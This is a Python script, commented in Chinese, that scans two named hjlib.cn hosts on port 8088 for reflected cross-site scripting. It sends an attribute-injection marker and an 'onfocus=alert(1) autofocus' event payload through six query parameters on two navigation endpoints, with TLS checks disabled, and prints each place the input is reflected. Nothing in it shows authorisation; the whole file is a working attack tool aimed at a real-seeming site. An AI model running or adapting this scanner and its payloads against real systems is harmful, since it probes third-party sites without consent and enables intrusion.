#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hjlib.cn XSS标签注入 - 用正确参数名测试
"""

import requests
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TAG = "85f7210c60a00209b3858749ec04d4d6"
PAYLOAD = f'1 web_xss_in_tag={TAG} blah='

# 正确的参数名
PARAM_NAMES = ["q", "filterDynasty", "filterReignTitle", "filterValue", "recordcode", "type"]

TARGETS = [
    ("www.hjlib.cn:8088", "http://www.hjlib.cn:8088"),
    ("thg.hjlib.cn:8088", "http://thg.hjlib.cn:8088"),
]

PATHS = [
    "/navigation/oldNavigationFacet.do",
    "/navigation/newNavigationFacet.do",
]

print("=" * 70)
print("  hjlib.cn XSS标签注入 - 正确参数测试")
print("=" * 70)

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
})

vuln_count = 0

for target_name, base in TARGETS:
    for path in PATHS:
        url = base + path
        print(f"\n{'='*70}")
        print(f"  {target_name}{path}")
        print(f"{'='*70}")

        for param in PARAM_NAMES:
            params = {param: PAYLOAD}
            try:
                resp = session.get(url, params=params, timeout=8, verify=False)
                body = resp.text

                if TAG in body:
                    idx = body.find(TAG)
                    ctx = body[max(0,idx-80):idx+80]
                    vuln_count += 1
                    print(f"  ✅ [{param}] -> 反射成功!")
                    print(f"     上下文: ...{ctx[:140]}...")
                elif "web_xss_in_tag" in body:
                    idx = body.find("web_xss_in_tag")
                    ctx = body[max(0,idx-60):idx+80]
                    vuln_count += 1
                    print(f"  ✅ [{param}] -> 部分反射!")
                    print(f"     上下文: ...{ctx[:140]}...")
            except requests.exceptions.Timeout:
                print(f"  ⏱️  [{param}] 超时")
            except Exception as e:
                print(f"  ❌ [{param}] {e}")

            time.sleep(0.2)

        # 测试 onfocus 事件注入
        onfocus_payload = '" onfocus=alert(1) autofocus="'
        for param in PARAM_NAMES:
            params = {param: onfocus_payload}
            try:
                resp = session.get(url, params=params, timeout=8, verify=False)
                if "onfocus" in resp.text and "alert" in resp.text:
                    idx = resp.text.find("onfocus")
                    ctx = resp.text[max(0,idx-60):idx+80]
                    print(f"  ✅ [{param}] onfocus注入反射!")
                    print(f"     上下文: ...{ctx[:140]}...")
            except:
                pass
            time.sleep(0.2)

print(f"\n{'='*70}")
print(f"  测试完成: {vuln_count} 个参数存在漏洞")
print(f"{'='*70}")
